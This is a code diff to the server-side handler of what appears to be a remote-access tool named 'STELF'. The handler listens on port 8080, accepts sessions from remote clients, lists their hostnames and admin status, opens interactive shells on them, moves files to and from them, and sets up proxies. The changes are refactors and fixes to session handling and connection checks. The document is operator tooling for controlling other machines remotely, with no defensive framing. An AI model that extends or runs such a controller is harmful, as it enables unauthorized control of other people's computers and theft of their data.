@@ -34,6 +34,10 @@ INFO = Style.BRIGHT + Fore.BLUE + "[*] " + Style.RESET_ALL
 BAD = Style.BRIGHT + Fore.RED + "[-] " + Style.RESET_ALL
 GOOD = Style.BRIGHT + Fore.GREEN + "[+] " + Style.RESET_ALL
 
+def print_info(data): print INFO + data
+def print_bad(data): print BAD + data
+def print_good(data): print GOOD + data
+
 logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 logging.critical("\n--------------------START OF NEW LOG--------------------\n")
 
@@ -264,6 +268,7 @@ class Client:
 		self.admin_privs = admin
 		
 		self.handler = handler
+		self.interacting = False
 		
 	def send(self, data):
 		self.transport.user_channel.write_output(data)
@@ -281,14 +286,14 @@ class Client:
 		self.transport.signal("DOWNLOAD_FILE:"+ch.id+":"+path)
 		
 		with open(path, "wb") as f:
-			print INFO + "Starting download..."
+			print_info("Starting download...")
 			data = ch.read_input()
 			if data.startswith("Error:"):
 				logging.error("Could not download file: "+data)
-				print BAD + data
+				print_bad(data)
 			elif data == chr(255):
 				logging.info("File is empty.")
-				print INFO + "File is empty."
+				print_info("File is empty.")
 			else:
 				f.write(data)
 				while True:
@@ -296,12 +301,12 @@ class Client:
 					if data == chr(255): break
 					f.write(data)
 				logging.info("Download complete.")
-				print GOOD + "Download complete!"
+				print_good("Download complete!")
 				
 	def upload(self, path):
 		logging.info("Starting upload of file: "+path)
 		if not os.path.isfile(path):
-			print BAD+"No such file: "+path
+			print_bad("No such file: "+path)
 			return
 			
 		ch = self.transport.create_channel()
@@ -335,12 +340,12 @@ class Client:
 		
 
 	def interact(self):
-	
+		self.interacting = True
 		logging.info("Starting interaction with client #"+str(self.id))
 		self.send("cd .")
 		cwd = self.recv()
 		if cwd == "CONN_LOST":
-			print BAD + "Client Disconnected"
+			print_bad("Client Disconnected")
 			return False			
 		sys.stdout.write(cwd)
 			
@@ -348,7 +353,8 @@ class Client:
 			try:
 				user_input = raw_input()
 			except KeyboardInterrupt:
-				print "\n" + INFO + "Backgrounding session."
+				print ""
+				print print_info("Backgrounding session.")
 				return True
 				
 			if not user_input: continue
@@ -360,7 +366,7 @@ class Client:
 					self.proxy_listener = ProxyListener(self, port)
 					user_input = "cd ."
 				except:
-					print BAD + "Invalid argument"
+					print_bad("Invalid argument")
 					
 			if user_input.startswith("download"):
 				#self.send(user_input)
@@ -381,15 +387,14 @@ class Client:
 			data = self.recv()
 			logging.debug("Result of user input: "+data)
 			if data == "CONN_LOST":
-				print BAD + "Client Disconnected"
+				print_bad("Client Disconnected")
 				return False
-			#elif data.startswith("BG_NEW_SESH"):
-				#print "\n" + GOOD + "A new session should appear within 30 seconds. (Try checking, it might have already connected!)"
-				#return True
+
 			elif data.startswith("AWAIT_NEW_SESH"):
-				print "let's wait for a bit, ok?"
+				print_info("Waiting for new session...")
 				self.handler.awaiting_session = True
 				return True
+				
 			data = data.replace("[-]", BAD).replace("[+]", GOOD).replace("[*]", INFO)
 			sys.stdout.write(data)
 		
@@ -463,32 +468,33 @@ class Handler:
 				
 				if not self.interacting and not self.awaiting_session:
 					sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
-					print INFO + "STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n"
+					print_info("STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n")
 					sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
 					sys.stdout.flush()
 			except Exception as e:
 				logging.info("A client connected, but disconnected before finishing the handshake.")
 	
-        def conn_check(self):
-            ct = threading.currentThread()
-            while not ct.stopped():
-                try:
-                    for client in self.clients:
-                        client.send("PING")
-                        response = client.recv().split("\n")[0]
+	def conn_check(self):
+		ct = threading.currentThread()
+		while not ct.stopped():
+			try:
+				for client in self.clients:
+					if not client.interacting:
+						client.send("PING")
+						response = client.recv().split("\n")[0]
 
-                        if response != "PONG":
-                            sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
-                            print BAD + "STELF session " + str(client.id) + " exited\n"
-                            sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
-                            sys.stdout.flush()
+						if response != "PONG":
+							sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
+							print_bad("STELF session " + str(client.id) + " exited\n")
+							sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
+							sys.stdout.flush()
 
-                            self.clients.remove(client)
-                    time.sleep(5)
-                except Exception as e:
-                    logging.info("There was an error trying to ping a client.")
-                
-                time.sleep(0.5)
+							self.clients.remove(client)
+				time.sleep(5)
+			except Exception as e:
+				logging.info("There was an error trying to ping a client.")
+			
+			time.sleep(0.5)
 
 	def run(self):
 		t = StoppableThread(target=self.accepter)
@@ -504,17 +510,19 @@ class Handler:
 						self.interacting = True
 						self.session_on_hold = None
 						self.awaiting_session = False
-						print "yay!"
+						print_good("Starting interaction with session "+str(self.dup_session.id))
 						self.dup_session.interact()
+						self.dup_session.interacting = False
 						self.dup_session = None
 					else: time.sleep(1)
 				
 				if not self.interacting:
-					print "nope"
+					print_bad("No new sessions connected, returning to initial session...")
 					self.interacting = True
-					self.session_on_hold = None
 					self.awaiting_session = False
 					self.session_on_hold.interact()
+					self.session_on_hold.interacting = False
+					self.session_on_hold = None
 					
 				self.interacting = False
 				continue
@@ -525,7 +533,7 @@ class Handler:
 				os._exit(0) # What is a graceful exit
 				
 			if user_input == "list" or user_input == "l":
-				print INFO + "Current active sessions:"
+				print_info("Current active sessions:")
 				print "========================"
 				for c in self.clients:
 					print "["+str(c.id)+"]: " + c.transport.address + ":" + str(c.transport.port)+" Hostname: "+c.hostname+", Admin: "+c.admin_privs
@@ -537,13 +545,14 @@ class Handler:
 				try:
 					the_chosen_one = [c for c in self.clients if c.id == int(user_input.split()[1])][0] # too lazy to make it properly
 				except:
-					print BAD + "No such client."
+					print_bad("No such client.")
 					continue
-				if not the_chosen_one.interact(): self.clients.remove(the_chosen_one)
+				if not the_chosen_one.interact():
+					self.clients.remove(the_chosen_one)
 				else:
+					the_chosen_one.interacting = False
 					if self.awaiting_session:
 						self.session_on_hold = the_chosen_one
 				self.interacting = False
 		
 handler = Handler("0.0.0.0",8080).run()
-
